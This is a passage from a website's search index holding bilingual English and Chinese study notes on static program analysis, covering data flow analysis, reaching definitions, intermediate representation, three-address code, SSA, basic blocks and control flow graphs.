reaches.(\u53ea\u8981\u5b58\u5728\u81f3\u5c11\u4e00\u6761\u5b9a\u4e49\u5230\u8fbe\u7684\u8def\u5f84\uff0c\u5b9a\u4e49\u5c31\u5230\u8fbe\u4e86\u7a0b\u5e8f\u70b9) Algorithm of Reaching Definitions Analysis # for example # \u7ecf\u8fc7\u4e09\u8f6e\u7684\u8fed\u4ee3\u4e4b\u540e\u6700\u540e\u5230\u8fbe\u4e00\u4e2a\u7a33\u6001\uff0c\u6240\u6709\u7684IN\u548cOUT\u90fd\u4e0d\u518d\u53d8\u5316\uff0c\u6b64\u65f6\u4e3a\u6700\u7ec8\u7ed3\u679c Why this iterative algorithm can finally stop? # \u9996\u5148gen\u548ckill\u662f\u5e38\u91cf\uff0c\u662f\u4e0d\u53ef\u53d8\u7684 \u5f53\"more facts\"\u6d41\u5165IN\u65f6\uff0c\"more facts\"\u8981\u4e48\u88ab\u6740\u6b7b\uff0c\u8981\u4e48\u6d41\u5411OUT\uff0c\u6211\u4eec\u79f0\u4e3asurvivor \u5f53\"fact\"\u6d41\u5165OUT\u65f6\uff0c\u65e0\u8bba\u5b83\u662f\u751f\u6210\u7684(gen)\u8fd8\u662f\u5b58\u6d3b\u7684(survivor)\uff0c\u5b83\u90fd\u5c06\u6c38\u8fdc\u7559\u5728OUT\u4e2d \u76f4\u5230OUT\u6c38\u8fdc\u4e0d\u53d8(0->1, 1->1) \u7531\u4e8efact\u96c6\u662f\u6709\u9650\u7684(\u4f8b\u5982: \u7a0b\u5e8f\u4e2d\u7684\u6240\u6709\u5b9a\u4e49) \uff0c\u56e0\u6b64\u5fc5\u7136\u5b58\u5728\u4e00\u4e2a\u8fed\u4ee3\u8fc7\u7a0b\uff0c\u5728\u6b64\u8fc7\u7a0b\u4e2d\u6ca1\u6709\u5411\u4efb\u4f55 OUT \u6dfb\u52a0\u4efb\u4f55\u5185\u5bb9\uff0c\u7136\u540e\u7b97\u6cd5\u7ec8\u6b62 Safe to terminate by this condition? # \u5f53OUT\u4e0d\u6539\u53d8\u65f6IN\u4e0d\u4f1a\u6539\u53d8 \u5f53IN\u4e0d\u6539\u53d8\u65f6OUT\u4e0d\u4f1a\u6539\u53d8 \u4ed6\u4eec\u6700\u7ec8\u4f1a\u5230\u8fbe\u4e00\u4e2a\u4e0d\u52a8\u70b9(\u8fd9\u4e5f\u4e0e\u5355\u8c03\u6027\u6709\u5173)","title":"Data Flow Analysis - Applications"},{"location":"%E5%AE%89%E5%85%A8/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/DataFlowAnalysis-Applications/#data-flow-analysis---applications","text":"","title":"Data Flow Analysis - Applications"},{"location":"%E5%AE%89%E5%85%A8/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/DataFlowAnalysis-Applications/#overview","text":"","title":"overview"},{"location":"%E5%AE%89%E5%85%A8/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/DataFlowAnalysis-Applications/#overview-of-data-flow-analysis","text":"Over- and under-approximations are both for safety of analysis (\u8fd9\u4e24\u79cd\u8fd1\u4f3c\u90fd\u662f\u5bf9\u4e8e\u5206\u6790\u6765\u8bf4\u90fd\u662fsafety\u7684)","title":"Overview of Data Flow Analysis"},{"location":"%E5%AE%89%E5%85%A8/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/DataFlowAnalysis-Applications/#may-analysis--over-approximation","text":"outputs information that may be true, it works for most static analyses (\u8f93\u51fa\u7684\u4fe1\u606f\u53ef\u80fd\u662f\u6b63\u786e\u7684\uff0c\u5b83\u9002\u7528\u4e8e\u7edd\u5927\u591a\u6570\u7684\u9759\u6001\u5206\u6790)","title":"may analysis / over-approximation"},{"location":"%E5%AE%89%E5%85%A8/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/DataFlowAnalysis-Applications/#must-analysis--under-approximation","text":"outputs information that must be true (\u8f93\u51fa\u7684\u4fe1\u606f\u5fc5\u987b\u662f\u6b63\u786e\u7684)","title":"must analysis / under-approximation"},{"location":"%E5%AE%89%E5%85%A8/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/DataFlowAnalysis-Applications/#for-example","text":"different data-flow analysis applications have different data abstraction and different flow safe-approximation strategies, i.e., different transfer functions and control-flow handlings (\u4e0d\u540c\u7684\u6570\u636e\u6d41\u5206\u6790\u6709\u4e0d\u540c\u7684\u6570\u636e\u62bd\u8c61\uff0c\u4e0d\u540c\u7684flow safe-approximation\uff0c\u4e0d\u540c\u7684\u8f6c\u6362\u51fd\u6570\u548c\u4e0d\u540c\u7684\u63a7\u5236\u6d41\u5904\u7406) \u4ee5\u7b2c\u4e00\u8282\u8bfe\u7684\u7b26\u53f7\u9759\u6001\u5206\u6790\u4e3a\u4f8b(\u5373\u5206\u6790\u53d8\u91cf\u7684\u7b26\u53f7\u4e3a\u6b63\uff0c\u8d1f\uff0c\u96f6\uff0c\u672a\u77e5\uff0c\u8fd8\u662f\u672a\u5b9a\u4e49) 1. \u8fd9\u91cc\u7684application-specific Data\u4e3a\u6211\u4eec\u5173\u6ce8\u7684\u7b26\u53f7 2. \u8fd9\u91cc\u7684transfer function\u4e3a\u7b26\u53f7\u8fd0\u7b97\u89c4\u5219(\u5982\u6b63\u6b63\u5f97\u6b63\uff0c\u6b63\u8d1f\u5f97\u8d1f) 3. \u8fd9\u91cc\u7684control-flow handling\u4e3a\u5c06\u8fd9\u4e9b\u7b26\u53f7\u5408\u5e76\u8d77\u6765\uff0c\u5f97\u5230\u7b26\u53f7\u53ef\u80fd\u7684\u7ed3\u679c","title":"for example"},{"location":"%E5%AE%89%E5%85%A8/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/DataFlowAnalysis-Applications/#three-key-points","text":"Abstract application-specific Data(\u62bd\u8c61\u51fa\u6211\u4eec\u5173\u6ce8\u7684\u6570\u636e) Describe transfer function(\u63cf\u8ff0\u8f6c\u6362\u51fd\u6570) Control-flow handling(\u5904\u7406\u63a7\u5236\u6d41)","title":"three key points"},{"location":"%E5%AE%89%E5%85%A8/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/DataFlowAnalysis-Applications/#preliminaries-of-data-flow-analysis","text":"","title":"Preliminaries of Data Flow Analysis"},{"location":"%E5%AE%89%E5%85%A8/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/DataFlowAnalysis-Applications/#input-and-output-states","text":"Each execution of an IR statement transforms an input state to a new output state(\u6bcf\u4e2a\u8bed\u53e5\u7684\u6267\u884c\u90fd\u4f1a\u5c06\u4e00\u4e2ainput\u72b6\u6001\u8f6c\u6362\u4e3a\u4e00\u4e2a\u65b0\u7684output\u72b6\u6001) The input (output) state is associated with the program point before (after) the statement (Input/output\u72b6\u6001\u662f\u4e0e\u8bed\u53e5\u6267\u884c\u524d/\u540e\u7684\u7a0b\u5e8f\u70b9\u76f8\u5173\u8054\u7684) In each data-flow analysis application, we associate with every program point a data-flow value that represents an abstraction of the set of all possible program states that can be observed for that point.(\u5728\u6bcf\u4e2a\u6570\u636e\u6d41\u5206\u6790\u5e94\u7528\u7a0b\u5e8f\u4e2d\uff0c\u6211\u4eec\u5c06\u6bcf\u4e2a\u7a0b\u5e8f\u70b9\u4e0e\u4e00\u4e2a\u6570\u636e\u6d41\u503c\u5173\u8054\u8d77\u6765\uff0c\u8fd9\u4e2a\u6570\u636e\u6d41\u503c\u8868\u793a\u53ef\u4ee5\u89c2\u5bdf\u5230\u7684\u6240\u6709\u53ef\u80fd\u7684\u7a0b\u5e8f\u72b6\u6001\u96c6\u7684\u62bd\u8c61) The set of possible dataflow values is the domain for this application(\u53ef\u80fd\u7684\u6570\u636e\u6d41\u503c\u96c6\u662f\u6b64\u5e94\u7528\u7a0b\u5e8f\u7684\u57df) Data-flow analysis is to find a solution to a set of safe-approximationdirected constraints on the IN[s]\u2019s and OUT[s]\u2019s, for all statements.(\u6570\u636e\u6d41\u5206\u6790\u5c31\u662f\u4e3a\u6240\u6709\u8bed\u53e5\u7684IN\u548cOUT\u627e\u5230\u4e00\u7ec4safe-approximationdirected\u7684\u7ea6\u675f\u7684\u89e3\u51b3\u65b9\u6848) constraints based on semantics of statements (transfer functions) (\u7ea6\u675f\u57fa\u4e8e\u8bed\u53e5\u8bed\u4e49) constraints based on the flows of control (\u7ea6\u675f\u57fa\u4e8e\u63a7\u5236\u6d41) \u8fd8\u662f\u4ee5\u7b2c\u4e00\u8282\u8bfe\u7684\u7b26\u53f7\u9759\u6001\u5206\u6790\u4e3a\u4f8b: - \u6211\u4eec\u5173\u6ce8\u7684\u662f\u7b26\u53f7\uff0c\u6240\u4ee5\u6b64\u5e94\u7528\u7a0b\u5e8f\u7684\u57df\u5c31\u4e3a\u8fd9\u51e0\u4e2a\u7b26\u53f7 - \u5728\u6bcf\u6b21\u8bed\u53e5\u6267\u884c\u540e\uff0c\u6211\u4eec\u5173\u6ce8\u6b64\u7a0b\u5e8f\u70b9\u7684\u53d8\u91cf(x,y)\u7684\u6240\u6709\u53ef\u80fd\u7b26\u53f7","title":"Input and Output States"},{"location":"%E5%AE%89%E5%85%A8/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/DataFlowAnalysis-Applications/#notations-for-transfer-functions-constraints","text":"Forward Analysis(\u6b63\u5411\u5206\u6790) Backward Analysis(\u53cd\u5411\u5206\u6790)","title":"Notations for Transfer Function\u2019s Constraints"},{"location":"%E5%AE%89%E5%85%A8/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/DataFlowAnalysis-Applications/#notations-for-control-flows-constraints","text":"The meet operator ^ is used to summarize the contributions from different paths at the confluence of those paths (\u4ea4\u8fd0\u7b97\u7b26 ^ \u662f\u7528\u4e8e\u6c47\u603b\u4e0d\u540c\u8def\u5f84\u5728\u6c47\u5408\u5904\u7684\u7ed3\u679c)","title":"Notations for Control Flow\u2019s Constraints"},{"location":"%E5%AE%89%E5%85%A8/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/DataFlowAnalysis-Applications/#reaching-definitions","text":"A definition d at program point p reaches a point q if there is a path from p to q such that d is not \u201ckilled\u201d along that path(\u53ef\u8fbe\u5b9a\u4e49\u5206\u6790\u5c31\u662f\u6307\u4e00\u4e2a\u5b9a\u4e49d\u5728\u7a0b\u5e8f\u70b9p\u80fd\u5426\u5230\u8fbe\u7a0b\u5e8f\u70b9q\uff0c\u5373\u662f\u5426\u5b58\u5728\u4e00\u6761\u4ecep\u5230q\u4e14\u5728\u9014\u4e2dd\u6ca1\u88ab\u6740\u6b7b\u7684\u8def\u5f84) - A definition of a variable v is a statement that assigns a value to v(\u53d8\u91cf v \u7684\u5b9a\u4e49\u662f\u4e00\u4e2a\u7ed9v\u8d4b\u503c\u7684\u8bed\u53e5) - Translated as: definition of variable v at program point p reaches point q if there is a path from p to q such that no new definition of v appears on that path(\u6362\u53e5\u8bdd\u8bf4: \u5982\u679c\u5b58\u5728\u4ece p \u5230 q \u7684\u8def\u5f84\uff0c\u4f7f\u5f97\u5728\u8fd9\u6761\u8def\u5f84\u4e0a\u4e0d\u4f1a\u51fa\u73b0\u65b0\u7684 v \u7684\u5b9a\u4e49\uff0c\u5219\u5b9a\u4e49d\u53ef\u4ecep\u62b5\u8fbeq) - Reaching definitions can be used to detect possible undefined variables. e.g., introduce a dummy definition for each variable v at the entry of CFG, and if the dummy definition of v reaches a point p where v is used, then v may be used before definition (as undefined reaches v) (\u53ef\u4ee5\u4f7f\u7528\u53ef\u8fbe\u5b9a\u4e49\u5206\u6790\u53ef\u80fd\u7684\u672a\u5b9a\u4e49\u53d8\u91cf\u3002\u4f8b\u5982\uff0c\u5728 CFG \u7684\u5165\u53e3\u5904\u4e3a\u6bcf\u4e2a\u53d8\u91cf v \u5f15\u5165\u4e00\u4e2a\u865a\u62df\u5b9a\u4e49\uff0c\u5982\u679c v \u7684\u865a\u62df\u5b9a\u4e49\u8fbe\u5230\u4e00\u4e2a\u70b9 p\uff0c\u90a3\u4e48v\u53ef\u80fd\u5728\u5b9a\u4e49\u4e4b\u524d\u4f7f\u7528)","title":"Reaching Definitions"},{"location":"%E5%AE%89%E5%85%A8/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/DataFlowAnalysis-Applications/#understanding-reaching-definitions","text":"\u6211\u4eec\u9700\u8981\u5bf9\u6211\u4eec\u5173\u6ce8\u7684\u6570\u636e\u8fdb\u884c\u62bd\u8c61\uff0c\u5728\u8fd9\u91cc\u6211\u4eec\u5173\u6ce8\u7684\u662f\u6240\u6709\u53d8\u91cf\u7684\u5b9a\u4e49\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u6bd4\u7279\u6d41\u6765\u8868\u793a\uff0c\u6bd4\u5982D1\uff0cD2\uff0cD3\uff0cD4\uff0c...\uff0cD100\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e2a100\u4f4d\u7684\u6bd4\u7279\u6d41\u6765\u8868\u793a\uff0c\u4ece\u5de6\u6570\u7b2ci\u4e2aBit\u4ee3\u8868\u7b2ci\u4e2a\u5b9a\u4e49\u662f\u5426\u53ef\u5230\u8fbe(0\u4e3a\u4e0d\u53ef\u8fbe\uff0c1\u4e3a\u53ef\u8fbe) \u4ee5\u4e00\u4e2a\u6211\u4eec\u5173\u6ce8\u7684\uff0c\u7b80\u5355\u7684\u5b9a\u4e49\u8bed\u53e5\u4e3a\u4f8b\uff0c\u8fd9\u6761\u5b9a\u4e49\u8bed\u53e5D\u5b9a\u4e49\u4e86\u53d8\u91cfv\u5e76\u4e14\u6740\u6b7b\u4e86\u5728\u7a0b\u5e8f\u4e2d\u5176\u4ed6\u5b9a\u4e49v\u7684\u8bed\u53e5\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5199\u51fa: - transfer function: OUT[B] = genB U (IN[B] - killB) \u8fd9\u91cc\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff0c\u7528\u4e8e\u7406\u89e3transfer function A definition reaches a program point as long as there exists at least one path along which the definition reaches.(\u53ea\u8981\u5b58\u5728\u81f3\u5c11\u4e00\u6761\u5b9a\u4e49\u5230\u8fbe\u7684\u8def\u5f84\uff0c\u5b9a\u4e49\u5c31\u5230\u8fbe\u4e86\u7a0b\u5e8f\u70b9)","title":"Understanding Reaching Definitions"},{"location":"%E5%AE%89%E5%85%A8/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/DataFlowAnalysis-Applications/#algorithm-of-reaching-definitions-analysis","text":"","title":"Algorithm of Reaching Definitions Analysis"},{"location":"%E5%AE%89%E5%85%A8/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/DataFlowAnalysis-Applications/#for-example_1","text":"\u7ecf\u8fc7\u4e09\u8f6e\u7684\u8fed\u4ee3\u4e4b\u540e\u6700\u540e\u5230\u8fbe\u4e00\u4e2a\u7a33\u6001\uff0c\u6240\u6709\u7684IN\u548cOUT\u90fd\u4e0d\u518d\u53d8\u5316\uff0c\u6b64\u65f6\u4e3a\u6700\u7ec8\u7ed3\u679c","title":"for example"},{"location":"%E5%AE%89%E5%85%A8/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/DataFlowAnalysis-Applications/#why-this-iterative-algorithm-can-finally-stop","text":"\u9996\u5148gen\u548ckill\u662f\u5e38\u91cf\uff0c\u662f\u4e0d\u53ef\u53d8\u7684 \u5f53\"more facts\"\u6d41\u5165IN\u65f6\uff0c\"more facts\"\u8981\u4e48\u88ab\u6740\u6b7b\uff0c\u8981\u4e48\u6d41\u5411OUT\uff0c\u6211\u4eec\u79f0\u4e3asurvivor \u5f53\"fact\"\u6d41\u5165OUT\u65f6\uff0c\u65e0\u8bba\u5b83\u662f\u751f\u6210\u7684(gen)\u8fd8\u662f\u5b58\u6d3b\u7684(survivor)\uff0c\u5b83\u90fd\u5c06\u6c38\u8fdc\u7559\u5728OUT\u4e2d \u76f4\u5230OUT\u6c38\u8fdc\u4e0d\u53d8(0->1, 1->1) \u7531\u4e8efact\u96c6\u662f\u6709\u9650\u7684(\u4f8b\u5982: \u7a0b\u5e8f\u4e2d\u7684\u6240\u6709\u5b9a\u4e49) \uff0c\u56e0\u6b64\u5fc5\u7136\u5b58\u5728\u4e00\u4e2a\u8fed\u4ee3\u8fc7\u7a0b\uff0c\u5728\u6b64\u8fc7\u7a0b\u4e2d\u6ca1\u6709\u5411\u4efb\u4f55 OUT \u6dfb\u52a0\u4efb\u4f55\u5185\u5bb9\uff0c\u7136\u540e\u7b97\u6cd5\u7ec8\u6b62","title":"Why this iterative algorithm can finally stop?"},{"location":"%E5%AE%89%E5%85%A8/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/DataFlowAnalysis-Applications/#safe-to-terminate-by-this-condition","text":"\u5f53OUT\u4e0d\u6539\u53d8\u65f6IN\u4e0d\u4f1a\u6539\u53d8 \u5f53IN\u4e0d\u6539\u53d8\u65f6OUT\u4e0d\u4f1a\u6539\u53d8 \u4ed6\u4eec\u6700\u7ec8\u4f1a\u5230\u8fbe\u4e00\u4e2a\u4e0d\u52a8\u70b9(\u8fd9\u4e5f\u4e0e\u5355\u8c03\u6027\u6709\u5173)","title":"Safe to terminate by this condition?"},{"location":"%E5%AE%89%E5%85%A8/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/IntermediateRepresentation%28%E4%B8%AD%E9%97%B4%E8%AF%AD%E8%A8%80%29/","text":"Intermediate Representation(\u4e2d\u95f4\u8bed\u8a00) # Compilers and Static Analyzers # Source Code -> Lexical Analysis(\u8bcd\u6cd5\u5206\u6790) -> Tokens Tokens -> Syntax Analysis(\u8bed\u6cd5\u5206\u6790) -> AST AST -> Semantic Analysis(\u8bed\u4e49\u5206\u6790) -> Decorated AST Decorated AST -> Translator(\u7ffb\u8bd1) -> IR IR -> Static Analysis(\u9759\u6001\u5206\u6790) -> Code Generator -> Machine Code AST vs. IR # AST # high-level and closed to grammar structure (\u9ad8\u7ea7\u5e76\u66f4\u63a5\u8fd1\u4e8e\u8bed\u6cd5\u7ed3\u6784) usually language dependent (\u901a\u5e38\u5b58\u5728\u8bed\u8a00\u4f9d\u8d56\uff0c\u5373\u6bcf\u79cd\u8bed\u8a00\u7684AST\u7ed3\u6784\u4e0d\u540c) suitable for fast type checking(\u66f4\u9002\u5408\u4e8e\u5feb\u901f\u7c7b\u578b\u68c0\u67e5) lack of control flow information(\u7f3a\u5c11\u63a7\u5236\u6d41\u4fe1\u606f) IR # low-level and closed to machine code (\u4f4e\u7ea7\u5e76\u66f4\u63a5\u8fd1\u4e8e\u673a\u5668\u8bed\u8a00) usually language independent (\u901a\u5e38\u6ca1\u6709\u8bed\u8a00\u4f9d\u8d56\uff0c\u5373\u6bcf\u79cd\u8bed\u8a00\u7684IR\u7ed3\u6784\u5927\u81f4\u76f8\u540c) compact and uniform (\u7d27\u51d1\u800c\u4e14\u6574\u9f50) contains control flow information (\u5305\u542b\u63a7\u5236\u6d41\u4fe1\u606f) usually considered as the basis for static analysis (\u901a\u5e38\u7528\u4e8e\u9759\u6001\u5206\u6790\u7684\u57fa\u7840) IR: Three-Address Code (3AC) # \u7279\u5f81 # \u5728\u53f3\u4fa7\u6700\u591a\u6709\u4e00\u4e2a\u64cd\u4f5c\u7b26 \u901a\u5e38\u662f\u6bd4\u8f83\u7b80\u5355\u7684\u8bed\u53e5(?\u4e2a\u4eba\u7406\u89e3) \u6700\u591a\u5305\u542b\u4e09\u4e2aaddress(?\u4e2a\u4eba\u7406\u89e3\u4e3a\u5bf9\u8c61) 3AC in Real Static Analyzer: Soot # Soot\u662f\u6700\u6d41\u884c\u7684java\u9759\u6001\u4ee3\u7801\u5206\u6790\u5de5\u5177\uff0c\u5b83\u7684IR\u662fJimple(typed 3AC) Static Single Assignment (SSA) # All assignments in SSA are to variables with distinct names(\u5728SSA\u4e2d\u7684\u6240\u6709\u8d4b\u503c\u90fd\u6307\u5411\u4e00\u4e2a\u65b0\u7684\u540d\u5b57) Every variable has exactly one definition(\u6bcf\u4e2a\u53d8\u91cf\u90fd\u6709\u4e14\u4ec5\u6709\u4e00\u4e2a\u786e\u5207\u7684\u5b9a\u4e49?) # \u5f53\u6709\u6761\u4ef6\u8bed\u53e5\u65f6\u4f8b\u5916\uff0c\u9700\u8981\u5f15\u5165phi-function\u8fd9\u4e2a\u6807\u8bb0\u7528\u4e8e\u5408\u5e76\u591a\u4e2a\u8282\u70b9\u7684\u503c Why SSA # Flow information is indirectly incorporated into the unique variable names(\u6d41\u4fe1\u606f\u95f4\u63a5\u5e76\u5165\u4e86\u72ec\u7acb\u7684\u53d8\u91cf\u540d\u4e2d) May help deliver some simpler analyses, e.g., flow-insensitive analysis gains partial precision of flow-sensitive analysis via SSA(\u53ef\u80fd\u53ef\u4ee5\u5e2e\u52a9\u7a0b\u5e8f\u66f4\u7b80\u5355\u5730\u8fdb\u884c\u5206\u6790\uff0c\uff0c\u6bd4\u5982\u901a\u8fc7SSA\uff0c\u6d41\u4fe1\u606f\u4e0d\u654f\u611f\u7684\u5206\u6790\u83b7\u5f97\u4e86\u6d41\u4fe1\u606f\u654f\u611f\u5206\u6790\u7684\u90e8\u5206\u7cbe\u5ea6) Define-and-Use pairs are explicit (\u5b9a\u4e49\u548c\u4f7f\u7528\u5bf9\u66f4\u52a0\u660e\u786e) Enable more effective data facts storage and propagation in some on-demand tasks (\u5728\u4e00\u4e9b\u6309\u9700\u4efb\u52a1\u4e2d\u5141\u8bb8\u66f4\u6709\u6548\u7684\u6570\u636e\u7684\u5b58\u50a8\u548c\u4f20\u64ad) Some optimization tasks perform better on SSA (e.g., conditional constant propagation, global value numbering) (\u4e00\u4e9b\u4f18\u5316\u9879\u76ee\u5728SSA\u4e0a\u5b8c\u6210\u5f97\u66f4\u597d) Why not SSA # SSA may introduce too many variables and phi-functions(SSA\u53ef\u80fd\u4f1a\u5f15\u5165\u592a\u591a\u7684\u53d8\u91cf\u548cphi-function) May introduce inefficiency problem when translating to machine code (due to copy operations) (\u53ef\u80fd\u4f1a\u5728\u7ffb\u8bd1\u6210\u673a\u5668\u7801\u65f6\u5bfc\u81f4\u6548\u7387\u4f4e\u4e0b\u7684\u95ee\u9898(\u7531\u4e8e\u590d\u5236\u64cd\u4f5c) ) Basic Blocks (BB) # Basic blocks (BB) are maximal sequences of consecutive three-address instructions with the properties that: (\u57fa\u7840\u5757 (BB) \u662f\u4e09\u5730\u5740\u7801(3AC)\u7684\u8fde\u7eed\u6700\u5927\u5e8f\u5217\uff0c\u5b83\u5177\u6709\u4ee5\u4e0b\u7684\u6027\u8d28) - It can be entered only at the beginning, i.e., the first instruction in the block (\u6709\u4e14\u53ea\u6709\u4e00\u4e2a\u5165\u53e3\uff0c\u662f\u5757\u7684\u7b2c\u4e00\u4e2a3AC) - It can be exited only at the end, i.e., the last instruction in the block (\u6709\u4e14\u53ea\u6709\u4e00\u4e2a\u51fa\u53e3\uff0c\u662f\u5757\u7684\u6700\u540e\u4e00\u4e2aAC) \u5212\u5206Basic blocks\u7684\u5173\u952e\u662fgoto(\u8df3\u8f6c\u6307\u4ee4) \uff0c\u5177\u4f53\u5212\u5206\u65b9\u6cd5\u5982\u4e0b: 1. \u6211\u4eec\u628aBB\u4e2d\u7684\u7b2c\u4e00\u4e2a3AC\u79f0\u4e3aleader\uff0c\u5212\u5206BB\u8f6c\u4e3a\u5bfb\u627e\u6240\u6709\u7684leader 2. \u7b2c\u4e00\u4e2a3AC\u4e3aleader 3. \u5bfb\u627e\u6240\u6709goto\uff0c\u5176\u76ee\u68073AC\u5373\u4e3aleader 4. \u5bfb\u627e\u6240\u6709goto\uff0c\u5176\u4e0b\u4e00\u4e2a3AC\u4e5f\u662fleader 5. \u53bb\u91cd\u4e4b\u540e\u627e\u5230\u6240\u6709\u7684leader\uff0c\u4ece\u4e00\u4e2aleader\u5230\u4e0b\u4e00\u4e2aleader\u4e4b\u524d\u5373\u4e3a\u4e00\u4e2aBB Control Flow Graphs (CFG) # The nodes of CFG are basic blocks(CFG\u7684\u6700\u5c0f\u8282\u70b9\u662fBB) There is an edge from block A to block B if and only if(\u4ece\u5757A\u5230\u5757B\u7684\u8df3\u8f6c\u65b9\u5f0f\u53ea\u6709if) There is a conditional or unconditional jump from the end of A to the beginning of B(\u4ece\u5757A\u5230\u5757B\u7684\u8df3\u8f6c\u65b9\u5f0f\u53ea\u6709\u6709\u6761\u4ef6\u7684\u6216\u65e0\u6761\u4ef6\u7684jump) B immediately follows A in the original order of instructions and A does not end in an unconditional jump(\u5757B\u6309\u7167\u987a\u5e8f\u7d27\u8ddf\u5728\u5757A\u4e4b\u540e\u4e14A\u4e0d\u662f\u4ee5\u4e00\u4e2a\u65e0\u6761\u4ef6\u7684\u8df3\u8f6c\u4f5c\u4e3a\u7ed3\u5c3e) \u6211\u4eec\u79f0\u5757A\u4e3a\u5757B\u7684\u524d\u8d8b\uff0c\u5757B\u4e3a\u5757A\u7684\u540e\u7ee7 \u6700\u7ec8\u76ee\u7684: \u5c06\u4e00\u6bb53AC\u8f6c\u4e3aCFG","title":"Intermediate Representation(\u4e2d\u95f4\u8bed\u8a00)"},{"location":"%E5%AE%89%E5%85%A8/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/IntermediateRepresentation%28%E4%B8%AD%E9%97%B4%E8%AF%AD%E8%A8%80%29/#intermediate-representation\u4e2d\u95f4\u8bed\u8a00","text":"","title":"Intermediate Representation(\u4e2d\u95f4\u8bed\u8a00)"},{"location":"%E5%AE%89%E5%85%A8/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/IntermediateRepresentation%28%E4%B8%AD%E9%97%B4%E8%AF%AD%E8%A8%80%29/#compilers-and-static-analyzers","text":"Source Code -> Lexical Analysis(\u8bcd\u6cd5\u5206\u6790) -> Tokens Tokens -> Syntax Analysis(\u8bed\u6cd5\u5206\u6790) -> AST AST -> Semantic Analysis(\u8bed\u4e49\u5206\u6790) -> Decorated AST Decorated AST -> Translator(\u7ffb\u8bd1) -> IR IR -> Static Analysis(\u9759\u6001\u5206\u6790) -> Code Generator -> Machine Code","title":"Compilers and Static Analyzers"},{"location":"%E5%AE%89%E5%85%A8/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/IntermediateRepresentation%28%E4%B8%AD%E9%97%B4%E8%AF%AD%E8%A8%80%29/#ast-vs-ir","text":"","title":"AST vs. IR"},{"location":"%E5%AE%89%E5%85%A8/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/IntermediateRepresentation%28%E4%B8%AD%E9%97%B4%E8%AF%AD%E8%A8%80%29/#ast","text":"high-level and closed to grammar structure (\u9ad8\u7ea7\u5e76\u66f4\u63a5\u8fd1\u4e8e\u8bed\u6cd5\u7ed3\u6784) usually language dependent (\u901a\u5e38\u5b58\u5728\u8bed\u8a00\u4f9d\u8d56\uff0c\u5373\u6bcf\u79cd\u8bed\u8a00\u7684AST\u7ed3\u6784\u4e0d\u540c) suitable for fast type checking(\u66f4\u9002\u5408\u4e8e\u5feb\u901f\u7c7b\u578b\u68c0\u67e5) lack of control flow information(\u7f3a\u5c11\u63a7\u5236\u6d41\u4fe1\u606f)","title":"AST"},{"location":"%E5%AE%89%E5%85%A8/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/IntermediateRepresentation%28%E4%B8%AD%E9%97%B4%E8%AF%AD%E8%A8%80%29/#ir","text":"low-level and closed to machine code (\u4f4e\u7ea7\u5e76\u66f4\u63a5\u8fd1\u4e8e\u673a\u5668\u8bed\u8a00) usually language independent (\u901a\u5e38\u6ca1\u6709\u8bed\u8a00\u4f9d\u8d56\uff0c\u5373\u6bcf\u79cd\u8bed\u8a00\u7684IR\u7ed3\u6784\u5927\u81f4\u76f8\u540c) compact and uniform (\u7d27\u51d1\u800c\u4e14\u6574\u9f50) contains control flow information (\u5305\u542b\u63a7\u5236\u6d41\u4fe1\u606f) usually considered as the basis for static analysis (\u901a\u5e38\u7528\u4e8e\u9759\u6001\u5206\u6790\u7684\u57fa\u7840)","title":"IR"},{"location":"%E5%AE%89%E5%85%A8/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/IntermediateRepresentation%28%E4%B8%AD%E9%97%B4%E8%AF%AD%E8%A8%80%29/#ir-three-address-code-3ac","text":"","title":"IR: Three-Address Code (3AC)"},{"location":"%E5%AE%89%E5%85%A8/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/IntermediateRepresentation%28%E4%B8%AD%E9%97%B4%E8%AF%AD%E8%A8%80%29/#\u7279\u5f81","text":"\u5728\u53f3\u4fa7\u6700\u591a\u6709\u4e00\u4e2a\u64cd\u4f5c\u7b26 \u901a\u5e38\u662f\u6bd4\u8f83\u7b80\u5355\u7684\u8bed\u53e5(?\u4e2a\u4eba\u7406\u89e3) \u6700\u591a\u5305\u542b\u4e09\u4e2aaddress(?\u4e2a\u4eba\u7406\u89e3\u4e3a\u5bf9\u8c61)","title":"\u7279\u5f81"},{"location":"%E5%AE%89%E5%85%A8/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/IntermediateRepresentation%28%E4%B8%AD%E9%97%B4%E8%AF%AD%E8%A8%80%29/#3ac-in-real-static-analyzer-soot","text":"Soot\u662f\u6700\u6d41\u884c\u7684java\u9759\u6001\u4ee3\u7801\u5206\u6790\u5de5\u5177\uff0c\u5b83\u7684IR\u662fJimple(typed 3AC)","title":"3AC in Real Static Analyzer: Soot"},{"location":"%E5%AE%89%E5%85%A8/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/IntermediateRepresentation%28%E4%B8%AD%E9%97%B4%E8%AF%AD%E8%A8%80%29/#static-single-assignment-ssa","text":"All assignments in SSA are to variables with distinct 